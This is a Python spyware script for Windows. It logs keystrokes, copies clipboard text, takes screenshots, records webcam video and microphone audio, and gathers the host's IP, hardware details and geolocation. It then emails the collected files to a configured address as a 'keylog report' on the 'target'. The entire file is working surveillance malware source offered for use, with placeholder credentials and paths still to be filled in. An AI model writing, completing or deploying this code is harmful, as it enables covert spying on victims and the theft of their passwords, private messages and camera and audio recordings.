import datetime
from geopy.geocoders import Nominatim
import requests
import socket
import platform
import win32clipboard
import cv2
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
import getpass
from requests import get
from multiprocessing import Process
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
datetime_spam = datetime.datetime.now()
year = int(datetime_spam.year)
month = int(datetime_spam.month)
day = int(datetime_spam.day)
# duration = 20
keys_information="key_log.txt"
system_information = "system.txt"
clipboard_information =" clipboard.txt"
audio_information = f"audio recording {day}-{month}-{year}.wav "
screenshot_information ="screenshot.png"
file_path= "path to the directory with "\\" "
extend="\\"


def send_email():
    # Email configuration
    smtp_server = 'smtp.emailserver.com'
    smtp_port = 587
    smtp_username = 'youremail@email.com'
    smtp_password = 'corresponding password'

    sender_email = 'youremail@email.com'
    receiver_email = 'recipientemail@email.com'
    subject = f'Keylog report for {day}-{month}-{year}'
    message = 'PFA the info collected from target.'

    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    # sending key_log
    attachment1 = open('path to file1.txt', 'rb')
    part1 = MIMEBase('application', 'octet-stream')
    part1.set_payload((attachment1).read())
    encoders.encode_base64(part1)
    part1.add_header('Content-Disposition', "attachment; filename=file1.txt")
    msg.attach(part1)

    # sending screenshot
    attachment2 = open('path to file2.txt', 'rb')
    part2 = MIMEBase('application', 'octet-stream')
    part2.set_payload((attachment2).read())
    encoders.encode_base64(part2)
    part2.add_header('Content-Disposition', "attachment; filename=file2.txt")
    msg.attach(part2)


    # Connect to the SMTP server and send the email
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Use TLS (for secure connection)
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print('Email sent successfully')
    except Exception as e:
        print(f'Email could not be sent: {str(e)}')


#to get the system's information
def computer_information():
    # Use a web service to get your public IP address
    response = requests.get("https://ipinfo.io")
    data = response.json()

    # Extract the latitude and longitude from the data
    location = data.get("loc")
    latitude, longitude = location.split(",")

    #print(f"Latitude: {latitude}, Longitude: {longitude}")

    # Use the latitude and longitude to get the location's details
    geolocator = Nominatim(user_agent="geoapiExercises")
    location = geolocator.reverse(f"{latitude}, {longitude}")
    #print(f"Location: {location.address}")

    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        f.write(f"this was created on {timestamp} \n")
        try :
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address:" + public_ip + '\n')

        except Exception:
            f.write(f"could not get the public IP of {hostname} ")
        f.write("processor:" + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname " + hostname + '\n')
        f.write("Private IP address: " + IPaddr + '\n')
        f.write("Longitude: "+ longitude + '\n')
        f.write("Latitude: " + latitude + '\n')
        #f.write("Location: " + location + '\n'

#computer_information()

#to copy the clipboard items
def copy_clipboard():
  #uses the win 32 clipboard
  with open(file_path + extend + clipboard_information, "a") as f:
      # there are texts and strings or a file like an image,video etc
      #in this we copy only strings for ease of use
      try:
          win32clipboard.OpenClipboard()
          copied_data = win32clipboard.GetClipboardData()
          win32clipboard.CloseClipboard()
          f.write("\n")
          f.write(f"this was created on {timestamp} \n")
          f.write("clip board Data: \n" + copied_data)
      except:
          f.write("item couldn't be copied as it was a file")
  print("\n")

#copy_clipboard()

#function to record audio
def rec_audio(duration):
    fs = 44100
    seconds = duration
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

#take screenshots
def screenshots():
    im = ImageGrab.grab()
    im.save( file_path + extend + screenshot_information)

#to record the video
def rec_video(duration):
    camera_obj = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    camera_obj.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    camera_obj.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

    fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
    datetime_spam = datetime.datetime.now()
    year = int(datetime_spam.year)
    month = int(datetime_spam.month)
    day = int(datetime_spam.day)
    output_file = f"{file_path}{extend}video recording {day}-{month}-{year}.mp4"
    writer = cv2.VideoWriter(output_file, fourcc, 10.0, (1280, 720))
    start_time = time.time()
    font = cv2.FONT_HERSHEY_SIMPLEX
    bottom_left_corner = (10, 50)
    font_scale = 1
    font_color = (255, 0, 0)  # blue color in BGR
    font_thickness = 2

    while True:
        ret, frame = camera_obj.read()

        if not ret:
            break

        # Get the current timestamp and format it
        current_time = datetime.datetime.now()
        timestamp_text = current_time.strftime("%Y-%m-%d %H:%M:%S")

        # Overlay the timestamp on the frame
        cv2.putText(frame, timestamp_text, bottom_left_corner, font, font_scale, font_color, font_thickness)

        writer.write(frame)

        if time.time() - start_time >= duration:
            break

    camera_obj.release()
    writer.release()
    cv2.destroyAllWindows()
#rec_video()
count = 0
keys = []
def rec_keys(duration):
    start_time = time.time()
    end_time = start_time + duration

    def on_press(key):
        global keys, count
        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
    def on_release(key):
        # if key == Key.esc:
        #     return False
        if time.time() > end_time:
            return False
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    start_time = time.time()
    rec_video(20)
    rec_audio(20)
    computer_information()
    copy_clipboard()
    screenshots()
    rec_keys(10)
    print("done keylogging")
    send_email()
